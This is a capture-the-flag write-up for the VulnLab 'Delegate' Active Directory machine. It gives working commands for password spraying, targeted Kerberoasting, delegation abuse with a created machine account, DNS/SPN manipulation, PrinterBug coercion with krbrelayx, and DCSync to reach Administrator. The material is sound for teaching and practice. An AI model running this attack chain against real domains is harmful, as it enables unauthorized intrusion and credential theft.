---
title: "Delegate VulnLab" 
date: 2025-09-16 23:50:00 0000+
tags: [WriteUp, Delegate, VL, Enumeration, Active Directory, SMB, UnconstrainedDelegation, Rusthound-CE, Delegation, TrustedForDelegate, Lateral Movement, RID Bruteforcing ,Bloodhound, Privilege Escalation, PasswordSpraying, AllowedToDelegate, ConstrainedDelegation, SeEnableDelegationPrivilege, krbrelayx, dnstool, addspn, DNS Abuse, NetExec, CoercePlus, Coercing, PrinterBug, PetitPotam ,Windows]
categories: [WriteUps,VulnLab]
image:
  path: /assets/images/Delegate_VL/preview_delegate.png
---
# Delegate VulnLab Writeup

Delegate is an Medium level active directory box from VulnLab hosted on HackTheBox which focusses mainly on delegation privileges on an AD Environment first we start off finding a users.bat file which gives us a password for a user in the domain and then doing some lateral movement in the domain we get to a user which can give delegation permissions to any of the objects in the domain, creating and granting a machine account some unconstrained delegation privileges we perform relay attack and by coercing the DC and directing this to a fake DNS record we get a ticket for the CIFS service enabling us to do a DCSync attack on the Domain by which we get the hash of the administrator account and pwn this machine.

![image.png](/assets/images/Delegate_VL/image.png)

## Initial Enumeration

As always we are gonna start off with the rustmap to find open ports and services running on the box.

```bash
rustmap.py -ip 10.129.242.110
```

![image.png](/assets/images/Delegate_VL/image%201.png)

![image.png](/assets/images/Delegate_VL/image%202.png)

There are several ports open on the box namely SMB, KERBEROS, LDAP, ADWS, WINRM etc.

We can also see that the hostname, domain and the domain controller’s name is revealed on the box.

I will add DC1.DELEGATE.VL and DELEGATE.VL to my /etc/hosts file.

Lets dig deep into enumeration.

### SMB Enumeration

Ports 139 and 445 are open on the box.

```bash
nxc smb delegate.vl -u '' -p ''
```

![image.png](/assets/images/Delegate_VL/image%203.png)

Lets check for guest access and parallelly enumerate the shares too. 

```bash
nxc smb delegate.vl -u '.' -p '' --shares
```

![image.png](/assets/images/Delegate_VL/image%204.png)

We dont have any special shares to look into, so lets try to bruteforce the RIDs.

```bash
nxc smb delegate.vl -u '.' -p '' --rid-brute
```

![image.png](/assets/images/Delegate_VL/image%205.png)

We have a numerous list of users and groups on the domain, I will save them to a file usernames.txt

Now we have all the usernames and groups in the domain.

Lets try to proceed with the password spray to find a valid hit.

```bash
nxc smb delegate.vl -u usernames.txt -p usernames.txt --continue-on-success --no-bruteforce
```

![image.png](/assets/images/Delegate_VL/image%206.png)

Nothing really interesting came up here.

So I connected to the accessible shares as guests.

```bash
smbclient //delegate.vl/NETLOGON '.'%
```

![image.png](/assets/images/Delegate_VL/image%207.png)

In the NETLOGON share we have a file named users.bat downloaded it using the Smbclient.

Now only the SYSVOL share is left so lets download what else we have in that share.

```bash
smbclient //delegate.vl/SYSVOL '.'%
```

![image.png](/assets/images/Delegate_VL/image%208.png)

So we have this following directory tree in front of us.

![image.png](/assets/images/Delegate_VL/image%209.png)

## Exploitation

Listing the contents of the users.bat file.

![image.png](/assets/images/Delegate_VL/image%2010.png)

Lets try to do a password spray on all the users.

### Password Spray

```bash
nxc smb delegate.vl -u usernames.txt -p 'P4ssw0rd1#123' --continue-on-success
```

![image.png](/assets/images/Delegate_VL/image%2011.png)

We have a valid hit!

I will save these creds in creds.txt file.

Now lets collect ldap data using the Rusthound.

### Bloodhound

Lets do some bloodhound analysis.

```bash
rusthound-ce -d delegate.vl -u 'a.briggs' -p 'P4ssw0rd1#123' -f dc1.delegate.vl -c All -z
```

![image.png](/assets/images/Delegate_VL/image%2012.png)

We see the following path in our domain.

![image.png](/assets/images/Delegate_VL/image%2013.png)

So lets first take over this **N.Thompson** user.

### A.Briggs → N.Thompson

We have generic write on N.thompson so we can take over him by doing a targetedkerberoasting attack.

```bash
/opt/targetedKerberoast/targetedKerberoast.py -v -d 'delegate.vl' -u 'a.briggs' -p 'P4ssw0rd1#123'
```

![image.png](/assets/images/Delegate_VL/image%2014.png)

Lets now Crack this hash using Hashcat.

### Hash Cracking

Cracking this hash.

```bash
hashcat -m 13100 nthompson.hash /usr/share/wordlists/rockyou.txt
```

![image.png](/assets/images/Delegate_VL/image%2015.png)

We have N.Thompson’s password as **KALEB_2341**

Lets verify it using NetExec.

```bash
nxc ldap delegate.vl -u 'n.thompson' -p 'KALEB_2341'
```

![image.png](/assets/images/Delegate_VL/image%2016.png)

### Shell as N.Thompson

Lets check for winrm access

```bash
nxc winrm delegate.vl -u 'n.thompson' -p 'KALEB_2341'
```

![image.png](/assets/images/Delegate_VL/image%2017.png)

Lets get a shell on the Box and grab the user.txt

```bash
evil-winrm -i delegate.vl -u 'n.thompson' -p 'KALEB_2341'
```

![image.png](/assets/images/Delegate_VL/image%2018.png)

Submitting the user.txt flag and moving forward with the privilege escalation.

## Privilege Escalation

### Constrained Delegation

Now lets find some vectors to escalate our privileges in the domain.

There are no outbound connections from N.Thompson but we do have one clue or hint this user is part of Delegation Admins group.

So when I checked the privileges associated with this user I got this.

```powershell
whoami /priv
```

![image.png](/assets/images/Delegate_VL/image%2019.png)

Means this user has permissions to grant a user delegation rights.

So lets create a machine account first.

```bash
impacket-addcomputer delegate.vl/'n.thompson':'KALEB_2341' -computer-name 'aashwin$' -computer-pass 'aashwin10!' -method SAMR
```

![image.png](/assets/images/Delegate_VL/image%2020.png)

To do this we must enable **TrustedToAuthForDelegation** flag on **aashwin$** account which we have just created.

```bash
bloodyAD -u 'N.Thompson' -p 'KALEB_2341' --host 'dc1.delegate.vl' -d 'delegate.vl' add uac 'aashwin$' -f 'TRUSTED_TO_AUTH_FOR_DELEGATION'
```

![image.png](/assets/images/Delegate_VL/image%2021.png)

Now lets check that the flag is set to true or not with our N.thompson’s shell.

```powershell
get-adcomputer -properties * -filter * | select trustedtoauthfordelegation, uac, samaccountname
```

![image.png](/assets/images/Delegate_VL/image%2022.png)

We can confirm this by using NetExec too.

```bash
nxc ldap delegate.vl -u 'n.thompson' -p 'KALEB_2341' --find-delegation
```

![image.png](/assets/images/Delegate_VL/image%2023.png)

Now we only have to provide the delegation rights.

So now we set the **msDS-AllowedToDelegateTo** flag.

This can also be done using BloodyAD.

```bash
bloodyAD -u 'n.thompson' -p 'KALEB_2341' --host 'dc1.delegate.vl' -d 'delegate.vl' set object 'aashwin$' 'msDS-AllowedToDelegateTo' -v 'HTTP/DC1.DELEGATE.VL'
```

![image.png](/assets/images/Delegate_VL/image%2024.png)

But we experienced some problems with the constrained delegation so lets proceed with the unconstrained delegation.

### Unconstrained Delegation

To do this we must first enable **TRUSTED_TO_AUTH** on our newly added computer account **aashwin$.**

![image.png](/assets/images/Delegate_VL/image%2025.png)

This can also be confirmed by NetExec.

```bash
nxc ldap delegate.vl -u 'n.thompson' -p 'KALEB_2341' --find-delegation
```

![image.png](/assets/images/Delegate_VL/image%2026.png)

We can refer to this great article on hacker.recipes

[https://www.thehacker.recipes/ad/movement/kerberos/delegations/unconstrained](https://www.thehacker.recipes/ad/movement/kerberos/delegations/unconstrained)

**We can also see that the signing is set to none means we can do unconstrained delegation.**

Now I will clone the repository from github for the unconstrained delegation.

[https://github.com/dirkjanm/krbrelayx.git](https://github.com/dirkjanm/krbrelayx.git)

Now we add a fake dns record so that the domain controller can talk to it using the [dnstool.py](http://dnstool.py) and check it that it is added or not.

```bash
python3 dnstool.py -u 'delegate.vl\aashwin$' -p 'aashwin10!' -dc-ip 10.129.242.110 -r aashwins29.delegate.vl -a add -d 10.10.14.20 -t A -dns-ip 10.129.242.110 dc1.delegate.vl
```

![image.png](/assets/images/Delegate_VL/image%2027.png)

We can check that the record is successfully added.

![image.png](/assets/images/Delegate_VL/image%2028.png)

### Relay Attack

Now we will perform the relay attack.

To do that we need the NTLM hash of the machine account that we created.

Used some online tools to get it.

```bash
7743E5E4F86ED6F20083E5849378C660
```

Now we will start listening for connections using krbrelayx.

```bash
python3 krbrelayx.py -hashes :7743e5e4f86ed6f20083e5849378c660
```

![image.png](/assets/images/Delegate_VL/image%2029.png)

Now we only need to coerce the DC to talk with our fake DNS record.

Confirming that it is vulnerable to the Coerce attacks using the NetExec’s Coerce module.

![image.png](/assets/images/Delegate_VL/image%2030.png)

But when I triggered this using all the modules in NetExec.

![image.png](/assets/images/Delegate_VL/image%2031.png)

**I got this error cause we had not set the fake SPN to the fake dns record we added.**

So lets just do that using addSPN.py from the krbrelayx collection repository created by Dirkjanm.

```bash
python addspn.py -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -s CIFS/aashwins29.delegate.vl dc1.delegate.vl -t 'aashwin$' -dc-ip 10.129.242.110
```

![image.png](/assets/images/Delegate_VL/image%2032.png)

Lets check that we have successfully modified the SPN of the fake dns record.

```bash
python3 addspn.py -u 'delegate.vl\n.thompson' -p 'KALEB_2341' -t 'aashwin$' -s 'CIFS/aashwins29.delegate.vl' -dc-ip 10.129.242.110 -q dc1.delegate.vl
```

![image.png](/assets/images/Delegate_VL/image%2033.png)

Now we will coerce the DC in contacting our fake host.

```bash
nxc smb delegate.vl -u 'aashwin$' -p 'aashwin10!' -M coerce_plus -o LISTENER=aashwins29.delegate.vl METHOD=Printerbug
```

![image.png](/assets/images/Delegate_VL/image%2034.png)

And on the Krbrelayx server we received a ticket.

![image.png](/assets/images/Delegate_VL/image%2035.png)

Means now we can do a DCSync attack on the DC and dump the whole database.

### Shell as Administrator

So lets export our ticket to the kerberos environment variable for linux.

```bash
export KRB5CCNAME=DC1\$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache
klist
```

![image.png](/assets/images/Delegate_VL/image%2036.png)

Lets now dump everything from the domian.

```bash
impacket-secretsdump -k -no-pass dc1.delegate.vl
```

![image.png](/assets/images/Delegate_VL/image%2037.png)

Lets confirm the administrator hash.

```bash
nxc smb delegate.vl -u 'Administrator' -H 'c32198ceab4cc695e65045562aa3ee93' --shares
```

![image.png](/assets/images/Delegate_VL/image%2038.png)

Lets now login with Administrator.

```bash
evil-winrm -i delegate.vl -u 'Administrator' -H 'c32198ceab4cc695e65045562aa3ee93'
```

![image.png](/assets/images/Delegate_VL/image%2039.png)

We are in!

Grabbing the root.txt and submitting it.

![image.png](/assets/images/Delegate_VL/image%2040.png)

Rooted!

![image.png](/assets/images/Delegate_VL/image%2041.png)

Thanks for reading 😊
